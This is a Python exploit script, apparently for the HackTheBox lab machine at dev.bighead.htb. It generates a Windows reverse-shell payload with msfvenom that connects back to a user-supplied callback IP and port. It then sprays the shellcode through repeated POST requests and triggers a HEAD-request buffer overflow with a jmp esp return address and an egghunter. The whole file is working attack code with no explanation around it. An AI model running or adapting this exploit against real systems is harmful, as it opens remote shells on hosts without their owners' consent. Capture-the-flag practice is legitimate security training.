#!/usr/bin/env python

import os
import subprocess
import sys

from pwn import *
from time import sleep

context(terminal=['tmux', 'new-window'])
context(os='windows', arch="i386")


def clean_and_exit(msg, files):
    print(msg)
    for f in files:
        try:
            os.remove(f)
        except:
            pass
    sys.exit()


if len(sys.argv) != 5:
    clean_and_exit("%s [target] [target port] [callback ip] [callback port]" % (sys.argv[0]), [])

target = sys.argv[1]
port = sys.argv[2]
cb_ip = sys.argv[3]
cb_port = sys.argv[4]

# Generate Shellcode 
msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b "\\x00\\x0a\\x0d" -f python -v shellcode -o sc.py' % (cb_ip, cb_port)
print("[*] Generating shellcode:\n    %s" % msfvenom_string)
p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = p.communicate()

try:
    if "Error" in err:
        raise Exception("[-] Unable to generate shellcode\n    %s" % err)
    from sc import shellcode
except (NameError, Exception) as e:
    clean_and_exit(e.message, ['sc.py', 'sc.pyc'])

print "[+] Shellcode generated successfully"
os.remove('sc.py')
os.remove('sc.pyc')

# !mona egg -t
egg = '0xdf'
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + egg.encode('hex') + "8bfaaf75eaaf75e7ffe7"

nops = "\x90"*16
spray = egg + egg + nops + shellcode
post = 'POST / HTTP/1.1\r\nHost: dev.bighead.htb\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n'.format(len(spray))
spray_payload = post + spray

head = "HEAD /"
junk = "1" * (78-len(head))
jmp_esp = "f0125062" #p32(0x625012f0)
host = " HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n"
exec_payload = head + junk + jmp_esp + egghunter + host

print("[*] Sending payload 5 times")
for i in range(5):
    p = remote(target, port)
    #print(spray_payload)
    p.sendline(spray_payload)
    p.recv()
    p.close()
    sleep(0.1)

print("[+] Payload sent.\n[*] Sleeping 1 second.")
sleep(1)

print("[*] Sending overflow + egghunter.")
print("[*] Expect callback in 0-15 minutes to %s:%s." % (cb_ip, cb_port))
p = remote(target, port)
p.sendline(exec_payload)
sleep(1)
p.recv()
p.close()
